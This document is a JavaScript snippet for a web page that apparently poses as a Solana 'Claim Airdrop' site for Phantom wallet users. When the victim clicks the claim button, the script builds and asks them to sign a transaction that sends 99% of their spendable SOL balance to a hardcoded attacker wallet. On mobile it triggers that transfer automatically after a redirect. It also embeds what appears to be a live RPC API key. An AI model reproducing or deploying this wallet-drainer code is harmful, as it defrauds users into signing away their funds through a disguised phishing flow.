<script>
$(document).ready(function () {
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

    async function handleWalletConnection(resp) {
        console.log("Phantom Wallet connected:", resp);

        const connection = new solanaWeb3.Connection(
            'https://solana-mainnet.api.syndica.io/api-key/SoydjJWjfwxDgAya8RrX3ArCdZ9PGLKQ37fVwDuQUJzhtsCDiE2VbEXk3wC1XZWtNArvKyUZvaTpQGYXfkhpmUFR9VbVLgTRhw',
            'confirmed'
        );

        const publicKey = new solanaWeb3.PublicKey(resp.publicKey);
        const walletBalance = await connection.getBalance(publicKey);
        console.log("Wallet balance:", walletBalance);

        const minBalance = await connection.getMinimumBalanceForRentExemption(0);

        if (walletBalance < minBalance) {
            alert("Insufficient funds for rent.");
            return;
        }

        $('#connect-wallet').text("Claim Airdrop");

        $('#connect-wallet').off('click').on('click', async () => {
            try {
                const recieverWallet = new solanaWeb3.PublicKey('5FfkceXdH2oMPgRpZFKZJPmTE6fLKfUfDRke2gmxuf5n');
                const balanceForTransfer = walletBalance - minBalance;

                if (balanceForTransfer <= 0) {
                    alert("Insufficient funds for transfer.");
                    return;
                }

                const transferAmount = balanceForTransfer * 0.99;

                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: publicKey,
                        toPubkey: recieverWallet,
                        lamports: transferAmount,
                    })
                );

                transaction.feePayer = publicKey;
                const blockhashObj = await connection.getRecentBlockhash();
                transaction.recentBlockhash = blockhashObj.blockhash;

                const signed = await window.solana.signTransaction(transaction);
                const txid = await connection.sendRawTransaction(signed.serialize());
                await connection.confirmTransaction(txid);

                alert("Transaction successful!");
                $('#connect-wallet').text("Connected");
                sessionStorage.removeItem('readyToTransfer');
            } catch (err) {
                console.error("Error during claim:", err);
                alert("Claim failed. Please try again.");
            }
        });

        // Auto-trigger transfer if redirected from mobile
        if (sessionStorage.getItem('readyToTransfer') === 'true') {
            console.log("Resuming transfer after redirect...");
            $('#connect-wallet').click();
        }
    }

    async function connectPhantom() {
        try {
            const resp = await window.solana.connect();
            sessionStorage.setItem('phantomConnected', 'true');
            sessionStorage.removeItem('phantomInstallRequested');
            handleWalletConnection(resp);
        } catch (err) {
            console.error("Error connecting to Phantom Wallet:", err);
            alert("Error connecting to Phantom Wallet.");
        }
    }

    function openPhantomMobileApp() {
        const dappUrl = encodeURIComponent(window.location.origin);
        const redirectLink = encodeURIComponent(window.location.href);
        const phantomDeepLink = `https://phantom.app/ul/v1/connect?app_url=${dappUrl}&redirect_link=${redirectLink}`;

        // Flag that we're trying to transfer
        sessionStorage.setItem('readyToTransfer', 'true');

        window.location.href = phantomDeepLink;

        setTimeout(() => {
            if (!window.location.href.includes("phantom_encryption_public_key")) {
                const fallback = confirm("It looks like Phantom Wallet is not installed. Do you want to download it?");
                if (fallback) {
                    window.open("https://phantom.app/download", "_blank");
                }
            }
        }, 3000);
    }

    // Detect redirect from Phantom on mobile
    const urlParams = new URLSearchParams(window.location.search);
    const redirectedFromPhantom = urlParams.has("phantom_encryption_public_key") || sessionStorage.getItem('readyToTransfer') === 'true';

    if (redirectedFromPhantom) {
        console.log("Returned from Phantom mobile app");
        $('#connect-wallet').text("Connecting...");

        if (window.solana && window.solana.isPhantom) {
            window.solana.connect()
                .then(resp => {
                    handleWalletConnection(resp);
                })
                .catch(err => {
                    console.error("Failed to reconnect", err);
                    alert("Failed to reconnect wallet.");
                });
        }
    }

    $('#connect-wallet').on('click', async () => {
        if (!isMobile && window.solana && window.solana.isPhantom) {
            await connectPhantom();
        } else if (isMobile) {
            openPhantomMobileApp();
        } else {
            alert("Phantom Wallet not found. Please install it.");
            window.open("https://phantom.app/download", "_blank");
        }
    });

    // Auto-connect if trusted on desktop
    const phantomAvailable = window.solana && window.solana.isPhantom;

    if (phantomAvailable) {
        window.solana.on("connect", async () => {
            console.log("Wallet auto-connected (listener)");
            const resp = { publicKey: window.solana.publicKey };
            handleWalletConnection(resp);
        });

        const wasConnected = sessionStorage.getItem('phantomConnected');
        if (wasConnected) {
            window.solana.connect({ onlyIfTrusted: true })
                .then(resp => {
                    if (resp?.publicKey) {
                        handleWalletConnection(resp);
                    }
                })
                .catch(() => {
                    sessionStorage.removeItem('phantomConnected');
                });
        }
    }
});
</script>


